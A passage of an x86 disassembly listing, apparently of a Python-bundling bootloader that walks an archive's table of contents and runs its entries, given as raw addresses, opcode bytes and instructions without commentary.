  401f56:	85 c0                	test   %eax,%eax
  401f58:	75 46                	jne    0x401fa0
  401f5a:	89 3c 24             	mov    %edi,(%esp)
  401f5d:	e8 fe 27 00 00       	call   0x404760
  401f62:	83 f8 ff             	cmp    $0xffffffff,%eax
  401f65:	0f 84 85 02 00 00    	je     0x4021f0
  401f6b:	8d 84 24 4f 20 00 00 	lea    0x204f(%esp),%eax
  401f72:	81 c7 68 20 00 00    	add    $0x2068,%edi
  401f78:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  401f7c:	89 7c 24 04          	mov    %edi,0x4(%esp)
  401f80:	89 04 24             	mov    %eax,(%esp)
  401f83:	e8 38 2b 00 00       	call   0x404ac0
  401f88:	83 f8 ff             	cmp    $0xffffffff,%eax
  401f8b:	0f 84 5f 02 00 00    	je     0x4021f0
  401f91:	31 c0                	xor    %eax,%eax
  401f93:	81 c4 5c 50 00 00    	add    $0x505c,%esp
  401f99:	5b                   	pop    %ebx
  401f9a:	5e                   	pop    %esi
  401f9b:	5f                   	pop    %edi
  401f9c:	5d                   	pop    %ebp
  401f9d:	c3                   	ret
  401f9e:	66 90                	xchg   %ax,%ax
  401fa0:	8b 44 24 38          	mov    0x38(%esp),%eax
  401fa4:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  401fa8:	c7 44 24 1c 96 c1 40 	movl   $0x40c196,0x1c(%esp)
  401faf:	00 
  401fb0:	89 74 24 18          	mov    %esi,0x18(%esp)
  401fb4:	c7 44 24 14 96 c1 40 	movl   $0x40c196,0x14(%esp)
  401fbb:	00 
  401fbc:	c7 44 24 10 98 c1 40 	movl   $0x40c198,0x10(%esp)
  401fc3:	00 
  401fc4:	89 44 24 08          	mov    %eax,0x8(%esp)
  401fc8:	8d 84 24 4f 20 00 00 	lea    0x204f(%esp),%eax
  401fcf:	c7 44 24 0c 96 c1 40 	movl   $0x40c196,0xc(%esp)
  401fd6:	00 
  401fd7:	c7 44 24 04 9b c1 40 	movl   $0x40c19b,0x4(%esp)
  401fde:	00 
  401fdf:	89 04 24             	mov    %eax,(%esp)
  401fe2:	e8 59 fe ff ff       	call   0x401e40
  401fe7:	85 c0                	test   %eax,%eax
  401fe9:	0f 84 6b ff ff ff    	je     0x401f5a
  401fef:	8b 44 24 38          	mov    0x38(%esp),%eax
  401ff3:	8d b4 24 4f 30 00 00 	lea    0x304f(%esp),%esi
  401ffa:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  401ffe:	c7 44 24 0c 96 c1 40 	movl   $0x40c196,0xc(%esp)
  402005:	00 
  402006:	c7 44 24 04 aa c1 40 	movl   $0x40c1aa,0x4(%esp)
  40200d:	00 
  40200e:	89 34 24             	mov    %esi,(%esp)
  402011:	89 44 24 08          	mov    %eax,0x8(%esp)
  402015:	e8 26 fe ff ff       	call   0x401e40
  40201a:	85 c0                	test   %eax,%eax
  40201c:	0f 85 9e 00 00 00    	jne    0x4020c0
  402022:	8b 7c 24 3c          	mov    0x3c(%esp),%edi
  402026:	8b 07                	mov    (%edi),%eax
  402028:	89 04 24             	mov    %eax,(%esp)
  40202b:	e8 30 27 00 00       	call   0x404760
  402030:	83 f8 ff             	cmp    $0xffffffff,%eax
  402033:	0f 84 df 00 00 00    	je     0x402118
  402039:	89 f8                	mov    %edi,%eax
  40203b:	8b 7f 04             	mov    0x4(%edi),%edi
  40203e:	8d 68 08             	lea    0x8(%eax),%ebp
  402041:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  402045:	85 ff                	test   %edi,%edi
  402047:	8d 50 04             	lea    0x4(%eax),%edx
  40204a:	75 15                	jne    0x402061
  40204c:	e9 0f 01 00 00       	jmp    0x402160
  402051:	89 ea                	mov    %ebp,%edx
  402053:	83 c5 04             	add    $0x4,%ebp
  402056:	8b 7d fc             	mov    -0x4(%ebp),%edi
  402059:	85 ff                	test   %edi,%edi
  40205b:	0f 84 ff 00 00 00    	je     0x402160
  402061:	8d 47 68             	lea    0x68(%edi),%eax
  402064:	89 74 24 04          	mov    %esi,0x4(%esp)
  402068:	89 04 24             	mov    %eax,(%esp)
  40206b:	e8 e8 87 00 00       	call   0x40a858
  402070:	85 c0                	test   %eax,%eax
  402072:	75 dd                	jne    0x402051
  402074:	8b 77 08             	mov    0x8(%edi),%esi
  402077:	3b 77 0c             	cmp    0xc(%edi),%esi
  40207a:	0f 83 11 ff ff ff    	jae    0x401f91
  402080:	8d 46 12             	lea    0x12(%esi),%eax
  402083:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  402087:	89 04 24             	mov    %eax,(%esp)
  40208a:	e8 c9 87 00 00       	call   0x40a858
  40208f:	85 c0                	test   %eax,%eax
  402091:	75 14                	jne    0x4020a7
  402093:	89 74 24 04          	mov    %esi,0x4(%esp)
  402097:	89 3c 24             	mov    %edi,(%esp)
  40209a:	e8 b1 f7 ff ff       	call   0x401850
  40209f:	85 c0                	test   %eax,%eax
  4020a1:	0f 85 8b 00 00 00    	jne    0x402132
  4020a7:	89 74 24 04          	mov    %esi,0x4(%esp)
  4020ab:	89 3c 24             	mov    %edi,(%esp)
  4020ae:	e8 1d f5 ff ff       	call   0x4015d0
  4020b3:	3b 47 0c             	cmp    0xc(%edi),%eax
  4020b6:	89 c6                	mov    %eax,%esi
  4020b8:	72 c6                	jb     0x402080
  4020ba:	e9 d2 fe ff ff       	jmp    0x401f91
  4020bf:	90                   	nop
  4020c0:	8b 44 24 38          	mov    0x38(%esp),%eax
  4020c4:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4020c8:	c7 44 24 0c 96 c1 40 	movl   $0x40c196,0xc(%esp)
  4020cf:	00 
  4020d0:	c7 44 24 04 b5 c1 40 	movl   $0x40c1b5,0x4(%esp)
  4020d7:	00 
  4020d8:	89 34 24             	mov    %esi,(%esp)
  4020db:	89 44 24 08          	mov    %eax,0x8(%esp)
  4020df:	e8 5c fd ff ff       	call   0x401e40
  4020e4:	85 c0                	test   %eax,%eax
  4020e6:	0f 84 36 ff ff ff    	je     0x402022
  4020ec:	8b 44 24 38          	mov    0x38(%esp),%eax
  4020f0:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4020f4:	c7 44 24 0c 96 c1 40 	movl   $0x40c196,0xc(%esp)
  4020fb:	00 
  4020fc:	c7 44 24 04 c0 c1 40 	movl   $0x40c1c0,0x4(%esp)
  402103:	00 
  402104:	89 34 24             	mov    %esi,(%esp)
  402107:	89 44 24 08          	mov    %eax,0x8(%esp)
  40210b:	e8 30 fd ff ff       	call   0x401e40
  402110:	85 c0                	test   %eax,%eax
  402112:	0f 84 0a ff ff ff    	je     0x402022
  402118:	89 74 24 04          	mov    %esi,0x4(%esp)
  40211c:	c7 04 24 c7 c1 40 00 	movl   $0x40c1c7,(%esp)
  402123:	e8 e8 fc ff ff       	call   0x401e10
  402128:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40212d:	e9 61 fe ff ff       	jmp    0x401f93
  402132:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  402136:	c7 04 24 3b c2 40 00 	movl   $0x40c23b,(%esp)
  40213d:	e8 ce fc ff ff       	call   0x401e10
  402142:	89 3c 24             	mov    %edi,(%esp)
  402145:	e8 be 86 00 00       	call   0x40a808
  40214a:	81 c4 5c 50 00 00    	add    $0x505c,%esp
  402150:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402155:	5b                   	pop    %ebx
  402156:	5e                   	pop    %esi
  402157:	5f                   	pop    %edi
  402158:	5d                   	pop    %ebp
  402159:	c3                   	ret
  40215a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402160:	c7 04 24 78 40 00 00 	movl   $0x4078,(%esp)
  402167:	89 54 24 38          	mov    %edx,0x38(%esp)
  40216b:	e8 50 86 00 00       	call   0x40a7c0
  402170:	85 c0                	test   %eax,%eax
  402172:	89 c7                	mov    %eax,%edi
  402174:	8b 54 24 38          	mov    0x38(%esp),%edx
  402178:	0f 84 a9 00 00 00    	je     0x402227
  40217e:	8d 40 68             	lea    0x68(%eax),%eax
  402181:	89 74 24 04          	mov    %esi,0x4(%esp)
  402185:	89 54 24 38          	mov    %edx,0x38(%esp)
  402189:	89 04 24             	mov    %eax,(%esp)
  40218c:	e8 97 86 00 00       	call   0x40a828
  402191:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  402195:	8b 28                	mov    (%eax),%ebp
  402197:	8d 85 68 10 00 00    	lea    0x1068(%ebp),%eax
  40219d:	89 44 24 04          	mov    %eax,0x4(%esp)
  4021a1:	8d 87 68 10 00 00    	lea    0x1068(%edi),%eax
  4021a7:	89 04 24             	mov    %eax,(%esp)
  4021aa:	e8 79 86 00 00       	call   0x40a828
  4021af:	8d 85 68 20 00 00    	lea    0x2068(%ebp),%eax
  4021b5:	89 44 24 04          	mov    %eax,0x4(%esp)
  4021b9:	8d 87 68 20 00 00    	lea    0x2068(%edi),%eax
  4021bf:	89 04 24             	mov    %eax,(%esp)
  4021c2:	e8 61 86 00 00       	call   0x40a828
  4021c7:	8b 85 68 40 00 00    	mov    0x4068(%ebp),%eax
  4021cd:	89 87 68 40 00 00    	mov    %eax,0x4068(%edi)
  4021d3:	89 3c 24             	mov    %edi,(%esp)
  4021d6:	e8 35 f7 ff ff       	call   0x401910
  4021db:	85 c0                	test   %eax,%eax
  4021dd:	8b 54 24 38          	mov    0x38(%esp),%edx
  4021e1:	75 27                	jne    0x40220a
  4021e3:	89 3a                	mov    %edi,(%edx)
  4021e5:	e9 8a fe ff ff       	jmp    0x402074
  4021ea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4021f0:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4021f4:	c7 04 24 2a c2 40 00 	movl   $0x40c22a,(%esp)
  4021fb:	e8 10 fc ff ff       	call   0x401e10
  402200:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402205:	e9 89 fd ff ff       	jmp    0x401f93
  40220a:	89 74 24 04          	mov    %esi,0x4(%esp)
  40220e:	c7 04 24 04 c2 40 00 	movl   $0x40c204,(%esp)
  402215:	e8 f6 fb ff ff       	call   0x401e10
  40221a:	89 3c 24             	mov    %edi,(%esp)
  40221d:	e8 e6 85 00 00       	call   0x40a808
  402222:	e9 f1 fe ff ff       	jmp    0x402118
  402227:	c7 04 24 e0 c1 40 00 	movl   $0x40c1e0,(%esp)
  40222e:	e8 dd fb ff ff       	call   0x401e10
  402233:	e9 e0 fe ff ff       	jmp    0x402118
  402238:	90                   	nop
  402239:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402240:	57                   	push   %edi
  402241:	56                   	push   %esi
  402242:	53                   	push   %ebx
  402243:	83 ec 10             	sub    $0x10,%esp
  402246:	8b 7c 24 20          	mov    0x20(%esp),%edi
  40224a:	8b 47 08             	mov    0x8(%edi),%eax
  40224d:	3b 47 0c             	cmp    0xc(%edi),%eax
  402250:	73 52                	jae    0x4022a4
  402252:	0f b6 50 11          	movzbl 0x11(%eax),%edx
  402256:	80 fa 64             	cmp    $0x64,%dl
  402259:	0f 94 c3             	sete   %bl
  40225c:	80 fa 78             	cmp    $0x78,%dl
  40225f:	0f 94 c1             	sete   %cl
  402262:	08 cb                	or     %cl,%bl
  402264:	74 22                	je     0x402288
  402266:	eb 48                	jmp    0x4022b0
  402268:	90                   	nop
  402269:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402270:	0f b6 50 11          	movzbl 0x11(%eax),%edx
  402274:	80 fa 64             	cmp    $0x64,%dl
  402277:	0f 94 c1             	sete   %cl
  40227a:	80 fa 78             	cmp    $0x78,%dl
  40227d:	89 ce                	mov    %ecx,%esi
  40227f:	0f 94 c1             	sete   %cl
  402282:	89 f3                	mov    %esi,%ebx
  402284:	08 cb                	or     %cl,%bl
  402286:	75 28                	jne    0x4022b0
  402288:	83 ea 5a             	sub    $0x5a,%edx
  40228b:	81 e2 f7 00 00 00    	and    $0xf7,%edx
  402291:	74 1d                	je     0x4022b0
  402293:	89 44 24 04          	mov    %eax,0x4(%esp)
  402297:	89 3c 24             	mov    %edi,(%esp)
  40229a:	e8 31 f3 ff ff       	call   0x4015d0
  40229f:	39 47 0c             	cmp    %eax,0xc(%edi)
  4022a2:	77 cc                	ja     0x402270
  4022a4:	83 c4 10             	add    $0x10,%esp
  4022a7:	31 c0                	xor    %eax,%eax
  4022a9:	5b                   	pop    %ebx
  4022aa:	5e                   	pop    %esi
  4022ab:	5f                   	pop    %edi
  4022ac:	c3                   	ret
  4022ad:	8d 76 00             	lea    0x0(%esi),%esi
  4022b0:	83 c4 10             	add    $0x10,%esp
  4022b3:	b8 01 00 00 00       	mov    $0x1,%eax
  4022b8:	5b                   	pop    %ebx
  4022b9:	5e                   	pop    %esi
  4022ba:	5f                   	pop    %edi
  4022bb:	c3                   	ret
  4022bc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4022c0:	55                   	push   %ebp
  4022c1:	57                   	push   %edi
  4022c2:	31 c0                	xor    %eax,%eax
  4022c4:	56                   	push   %esi
  4022c5:	53                   	push   %ebx
  4022c6:	b9 14 00 00 00       	mov    $0x14,%ecx
  4022cb:	83 ec 6c             	sub    $0x6c,%esp
  4022ce:	8b b4 24 80 00 00 00 	mov    0x80(%esp),%esi
  4022d5:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  4022d9:	89 ef                	mov    %ebp,%edi
  4022db:	8b 5e 08             	mov    0x8(%esi),%ebx
  4022de:	3b 5e 0c             	cmp    0xc(%esi),%ebx
  4022e1:	f3 ab                	rep stos %eax,%es:(%edi)
  4022e3:	89 74 24 10          	mov    %esi,0x10(%esp)
  4022e7:	72 22                	jb     0x40230b
  4022e9:	e9 8e 00 00 00       	jmp    0x40237c
  4022ee:	66 90                	xchg   %ax,%ax
  4022f0:	3c 78                	cmp    $0x78,%al
  4022f2:	74 26                	je     0x40231a
  4022f4:	3c 64                	cmp    $0x64,%al
  4022f6:	74 3d                	je     0x402335
  4022f8:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4022fc:	89 34 24             	mov    %esi,(%esp)
  4022ff:	e8 cc f2 ff ff       	call   0x4015d0
  402304:	39 46 0c             	cmp    %eax,0xc(%esi)
  402307:	89 c3                	mov    %eax,%ebx
  402309:	76 45                	jbe    0x402350
  40230b:	0f b6 43 11          	movzbl 0x11(%ebx),%eax
  40230f:	8d 50 a6             	lea    -0x5a(%eax),%edx
  402312:	81 e2 f7 00 00 00    	and    $0xf7,%edx
  402318:	75 d6                	jne    0x4022f0
  40231a:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  40231e:	89 34 24             	mov    %esi,(%esp)
  402321:	e8 2a f5 ff ff       	call   0x401850
  402326:	85 c0                	test   %eax,%eax
  402328:	74 ce                	je     0x4022f8
  40232a:	8b 54 24 14          	mov    0x14(%esp),%edx
  40232e:	be ff ff ff ff       	mov    $0xffffffff,%esi
  402333:	eb 21                	jmp    0x402356
  402335:	8d 53 12             	lea    0x12(%ebx),%edx
  402338:	89 e8                	mov    %ebp,%eax
  40233a:	e8 41 fb ff ff       	call   0x401e80
  40233f:	83 f8 ff             	cmp    $0xffffffff,%eax
  402342:	75 b4                	jne    0x4022f8
  402344:	eb e4                	jmp    0x40232a
  402346:	8d 76 00             	lea    0x0(%esi),%esi
  402349:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402350:	8b 54 24 14          	mov    0x14(%esp),%edx
  402354:	31 f6                	xor    %esi,%esi
  402356:	85 d2                	test   %edx,%edx
  402358:	8d 5c 24 18          	lea    0x18(%esp),%ebx
  40235c:	74 14                	je     0x402372
  40235e:	66 90                	xchg   %ax,%ax
  402360:	89 14 24             	mov    %edx,(%esp)
  402363:	83 c3 04             	add    $0x4,%ebx
  402366:	e8 d5 f9 ff ff       	call   0x401d40
  40236b:	8b 53 fc             	mov    -0x4(%ebx),%edx
  40236e:	85 d2                	test   %edx,%edx
  402370:	75 ee                	jne    0x402360
  402372:	83 c4 6c             	add    $0x6c,%esp
  402375:	89 f0                	mov    %esi,%eax
  402377:	5b                   	pop    %ebx
  402378:	5e                   	pop    %esi
  402379:	5f                   	pop    %edi
  40237a:	5d                   	pop    %ebp
  40237b:	c3                   	ret
  40237c:	31 f6                	xor    %esi,%esi
  40237e:	eb f2                	jmp    0x402372
  402380:	55                   	push   %ebp
  402381:	57                   	push   %edi
  402382:	b8 2c 10 00 00       	mov    $0x102c,%eax
  402387:	56                   	push   %esi
  402388:	53                   	push   %ebx
  402389:	e8 c2 81 00 00       	call   0x40a550
  40238e:	29 c4                	sub    %eax,%esp
  402390:	8b b4 24 40 10 00 00 	mov    0x1040(%esp),%esi
  402397:	8d 7c 24 20          	lea    0x20(%esp),%edi
  40239b:	8b 5e 08             	mov    0x8(%esi),%ebx
  40239e:	c7 04 24 50 c2 40 00 	movl   $0x40c250,(%esp)
  4023a5:	ff 15 78 10 41 00    	call   *0x411078
  4023ab:	3b 5e 0c             	cmp    0xc(%esi),%ebx
  4023ae:	89 44 24 18          	mov    %eax,0x18(%esp)
  4023b2:	72 23                	jb     0x4023d7
  4023b4:	e9 e7 00 00 00       	jmp    0x4024a0
  4023b9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4023c0:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4023c4:	89 34 24             	mov    %esi,(%esp)
  4023c7:	e8 04 f2 ff ff       	call   0x4015d0
  4023cc:	39 46 0c             	cmp    %eax,0xc(%esi)
  4023cf:	89 c3                	mov    %eax,%ebx
  4023d1:	0f 86 c9 00 00 00    	jbe    0x4024a0
  4023d7:	80 7b 11 73          	cmpb   $0x73,0x11(%ebx)
  4023db:	75 e3                	jne    0x4023c0
  4023dd:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4023e1:	89 34 24             	mov    %esi,(%esp)
  4023e4:	e8 27 f2 ff ff       	call   0x401610
  4023e9:	89 c5                	mov    %eax,%ebp
  4023eb:	8d 43 12             	lea    0x12(%ebx),%eax
  4023ee:	89 3c 24             	mov    %edi,(%esp)
  4023f1:	89 44 24 04          	mov    %eax,0x4(%esp)
  4023f5:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4023f9:	e8 2a 84 00 00       	call   0x40a828
  4023fe:	89 fa                	mov    %edi,%edx
  402400:	8b 0a                	mov    (%edx),%ecx
  402402:	83 c2 04             	add    $0x4,%edx
  402405:	8d 81 ff fe fe fe    	lea    -0x1010101(%ecx),%eax
  40240b:	f7 d1                	not    %ecx
  40240d:	21 c8                	and    %ecx,%eax
  40240f:	25 80 80 80 80       	and    $0x80808080,%eax
  402414:	74 ea                	je     0x402400
  402416:	89 c1                	mov    %eax,%ecx
  402418:	c1 e9 10             	shr    $0x10,%ecx
  40241b:	a9 80 80 00 00       	test   $0x8080,%eax
  402420:	0f 44 c1             	cmove  %ecx,%eax
  402423:	8d 4a 02             	lea    0x2(%edx),%ecx
  402426:	0f 44 d1             	cmove  %ecx,%edx
  402429:	00 c0                	add    %al,%al
  40242b:	a1 74 d6 41 00       	mov    0x41d674,%eax
  402430:	83 da 03             	sbb    $0x3,%edx
  402433:	c7 02 2e 70 79 00    	movl   $0x79702e,(%edx)
  402439:	89 3c 24             	mov    %edi,(%esp)
  40243c:	85 c0                	test   %eax,%eax
  40243e:	74 50                	je     0x402490
  402440:	ff 15 50 10 41 00    	call   *0x411050
  402446:	89 c2                	mov    %eax,%edx
  402448:	8b 44 24 18          	mov    0x18(%esp),%eax
  40244c:	89 54 24 08          	mov    %edx,0x8(%esp)
  402450:	89 54 24 14          	mov    %edx,0x14(%esp)
  402454:	c7 44 24 04 59 c2 40 	movl   $0x40c259,0x4(%esp)
  40245b:	00 
  40245c:	89 04 24             	mov    %eax,(%esp)
  40245f:	ff 15 58 10 41 00    	call   *0x411058
  402465:	8b 54 24 14          	mov    0x14(%esp),%edx
  402469:	89 14 24             	mov    %edx,(%esp)
  40246c:	ff 15 b8 10 41 00    	call   *0x4110b8
  402472:	89 2c 24             	mov    %ebp,(%esp)
  402475:	ff 15 54 10 41 00    	call   *0x411054
  40247b:	85 c0                	test   %eax,%eax
  40247d:	75 31                	jne    0x4024b0
  40247f:	89 2c 24             	mov    %ebp,(%esp)
  402482:	e8 81 83 00 00       	call   0x40a808
  402487:	e9 34 ff ff ff       	jmp    0x4023c0
  40248c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402490:	ff 15 34 10 41 00    	call   *0x411034
  402496:	89 c2                	mov    %eax,%edx
  402498:	eb ae                	jmp    0x402448
  40249a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4024a0:	81 c4 2c 10 00 00    	add    $0x102c,%esp
  4024a6:	31 c0                	xor    %eax,%eax
  4024a8:	5b                   	pop    %ebx
  4024a9:	5e                   	pop    %esi
  4024aa:	5f                   	pop    %edi
  4024ab:	5d                   	pop    %ebp
  4024ac:	c3                   	ret
  4024ad:	8d 76 00             	lea    0x0(%esi),%esi
  4024b0:	89 44 24 08          	mov    %eax,0x8(%esp)
  4024b4:	89 44 24 14          	mov    %eax,0x14(%esp)
  4024b8:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4024bc:	c7 04 24 62 c2 40 00 	movl   $0x40c262,(%esp)
  4024c3:	89 44 24 04          	mov    %eax,0x4(%esp)
  4024c7:	e8 44 f9 ff ff       	call   0x401e10
  4024cc:	8b 44 24 14          	mov    0x14(%esp),%eax
  4024d0:	81 c4 2c 10 00 00    	add    $0x102c,%esp
  4024d6:	5b                   	pop    %ebx
  4024d7:	5e                   	pop    %esi
  4024d8:	5f                   	pop    %edi
  4024d9:	5d                   	pop    %ebp
  4024da:	c3                   	ret
  4024db:	90                   	nop
  4024dc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4024e0:	57                   	push   %edi
  4024e1:	56                   	push   %esi
  4024e2:	53                   	push   %ebx
  4024e3:	83 ec 10             	sub    $0x10,%esp
  4024e6:	c7 04 24 50 c2 40 00 	movl   $0x40c250,(%esp)
  4024ed:	ff 15 78 10 41 00    	call   *0x411078
  4024f3:	85 c0                	test   %eax,%eax
  4024f5:	0f 84 b5 00 00 00    	je     0x4025b0
  4024fb:	89 04 24             	mov    %eax,(%esp)
  4024fe:	ff 15 60 10 41 00    	call   *0x411060
  402504:	8b 54 24 20          	mov    0x20(%esp),%edx
  402508:	89 04 24             	mov    %eax,(%esp)
  40250b:	89 54 24 04          	mov    %edx,0x4(%esp)
  40250f:	ff 15 94 10 41 00    	call   *0x411094
  402515:	85 c0                	test   %eax,%eax
  402517:	89 c3                	mov    %eax,%ebx
  402519:	0f 84 a1 00 00 00    	je     0x4025c0
  40251f:	c7 44 24 04 72 c2 40 	movl   $0x40c272,0x4(%esp)
  402526:	00 
  402527:	89 04 24             	mov    %eax,(%esp)
  40252a:	ff 15 5c 10 41 00    	call   *0x41105c
  402530:	85 c0                	test   %eax,%eax
  402532:	89 c6                	mov    %eax,%esi
  402534:	0f 84 96 00 00 00    	je     0x4025d0
  40253a:	ff 15 90 10 41 00    	call   *0x411090
  402540:	89 34 24             	mov    %esi,(%esp)
  402543:	bf ff ff ff ff       	mov    $0xffffffff,%edi
  402548:	ff 15 64 10 41 00    	call   *0x411064
  40254e:	8b 54 24 24          	mov    0x24(%esp),%edx
  402552:	89 02                	mov    %eax,(%edx)
  402554:	ff 15 8c 10 41 00    	call   *0x41108c
  40255a:	85 c0                	test   %eax,%eax
  40255c:	74 27                	je     0x402585
  40255e:	89 1c 24             	mov    %ebx,(%esp)
  402561:	ff 15 b8 10 41 00    	call   *0x4110b8
  402567:	89 34 24             	mov    %esi,(%esp)
  40256a:	ff 15 b8 10 41 00    	call   *0x4110b8
  402570:	ff 15 88 10 41 00    	call   *0x411088
  402576:	ff 15 90 10 41 00    	call   *0x411090
  40257c:	83 c4 10             	add    $0x10,%esp
  40257f:	89 f8                	mov    %edi,%eax
  402581:	5b                   	pop    %ebx
  402582:	5e                   	pop    %esi
  402583:	5f                   	pop    %edi
  402584:	c3                   	ret
  402585:	89 1c 24             	mov    %ebx,(%esp)
  402588:	31 ff                	xor    %edi,%edi
  40258a:	ff 15 b8 10 41 00    	call   *0x4110b8
  402590:	89 34 24             	mov    %esi,(%esp)
  402593:	ff 15 b8 10 41 00    	call   *0x4110b8
  402599:	ff 15 90 10 41 00    	call   *0x411090
  40259f:	83 c4 10             	add    $0x10,%esp
  4025a2:	89 f8                	mov    %edi,%eax
  4025a4:	5b                   	pop    %ebx
  4025a5:	5e                   	pop    %esi
  4025a6:	5f                   	pop    %edi
  4025a7:	c3                   	ret
  4025a8:	90                   	nop
  4025a9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4025b0:	31 f6                	xor    %esi,%esi
  4025b2:	31 db                	xor    %ebx,%ebx
  4025b4:	bf ff ff ff ff       	mov    $0xffffffff,%edi
  4025b9:	eb a3                	jmp    0x40255e
  4025bb:	90                   	nop
  4025bc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4025c0:	31 f6                	xor    %esi,%esi
  4025c2:	bf fe ff ff ff       	mov    $0xfffffffe,%edi
  4025c7:	eb 95                	jmp    0x40255e
  4025c9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4025d0:	bf ff ff ff ff       	mov    $0xffffffff,%edi
  4025d5:	eb 87                	jmp    0x40255e
  4025d7:	89 f6                	mov    %esi,%esi
  4025d9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4025e0:	53                   	push   %ebx
  4025e1:	83 ec 18             	sub    $0x18,%esp
  4025e4:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4025e8:	c7 44 24 04 73 c2 40 	movl   $0x40c273,0x4(%esp)
  4025ef:	00 
  4025f0:	89 1c 24             	mov    %ebx,(%esp)
  4025f3:	e8 98 f7 ff ff       	call   0x401d90
  4025f8:	85 c0                	test   %eax,%eax
  4025fa:	74 34                	je     0x402630
  4025fc:	81 c3 68 30 00 00    	add    $0x3068,%ebx
  402602:	89 44 24 08          	mov    %eax,0x8(%esp)
  402606:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40260d:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  402611:	e8 8a 04 00 00       	call   0x402aa0
  402616:	89 c3                	mov    %eax,%ebx
  402618:	89 04 24             	mov    %eax,(%esp)
  40261b:	e8 80 2c 00 00       	call   0x4052a0
  402620:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  402624:	83 c4 18             	add    $0x18,%esp
  402627:	5b                   	pop    %ebx
  402628:	e9 db 81 00 00       	jmp    0x40a808
  40262d:	8d 76 00             	lea    0x0(%esi),%esi
  402630:	83 c4 18             	add    $0x18,%esp
  402633:	5b                   	pop    %ebx
  402634:	c3                   	ret
  402635:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402639:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402640:	53                   	push   %ebx
  402641:	83 ec 18             	sub    $0x18,%esp
  402644:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  402648:	89 1c 24             	mov    %ebx,(%esp)
  40264b:	e8 b0 14 00 00       	call   0x403b00
  402650:	85 c0                	test   %eax,%eax
  402652:	75 3c                	jne    0x402690
  402654:	c7 83 6c 40 00 00 01 	movl   $0x1,0x406c(%ebx)
  40265b:	00 00 00 
  40265e:	89 1c 24             	mov    %ebx,(%esp)
  402661:	e8 3a 17 00 00       	call   0x403da0
  402666:	85 c0                	test   %eax,%eax
  402668:	75 26                	jne    0x402690
  40266a:	89 1c 24             	mov    %ebx,(%esp)
  40266d:	e8 be 1a 00 00       	call   0x404130
  402672:	85 c0                	test   %eax,%eax
  402674:	75 1a                	jne    0x402690
  402676:	89 1c 24             	mov    %ebx,(%esp)
  402679:	e8 02 1e 00 00       	call   0x404480
  40267e:	85 c0                	test   %eax,%eax
  402680:	75 0e                	jne    0x402690
  402682:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  402686:	83 c4 18             	add    $0x18,%esp
  402689:	5b                   	pop    %ebx
  40268a:	e9 f1 fc ff ff       	jmp    0x402380
  40268f:	90                   	nop
  402690:	83 c4 18             	add    $0x18,%esp
  402693:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402698:	5b                   	pop    %ebx
  402699:	c3                   	ret
  40269a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4026a0:	e9 2b 1e 00 00       	jmp    0x4044d0
  4026a5:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4026a9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4026b0:	f3 c3                	repz ret
  4026b2:	90                   	nop
  4026b3:	90                   	nop
  4026b4:	90                   	nop
  4026b5:	90                   	nop
  4026b6:	90                   	nop
  4026b7:	90                   	nop
  4026b8:	90                   	nop
  4026b9:	90                   	nop
  4026ba:	90                   	nop
  4026bb:	90                   	nop
  4026bc:	90                   	nop
  4026bd:	90                   	nop
  4026be:	90                   	nop
  4026bf:	90                   	nop
  4026c0:	55                   	push   %ebp
  4026c1:	57                   	push   %edi
  4026c2:	b8 1c 30 00 00       	mov    $0x301c,%eax
  4026c7:	56                   	push   %esi
  4026c8:	53                   	push   %ebx
  4026c9:	e8 82 7e 00 00       	call   0x40a550
  4026ce:	29 c4                	sub    %eax,%esp
  4026d0:	c7 44 24 04 78 40 00 	movl   $0x4078,0x4(%esp)
  4026d7:	00 
  4026d8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  4026df:	e8 7c 81 00 00       	call   0x40a860
  4026e4:	85 c0                	test   %eax,%eax
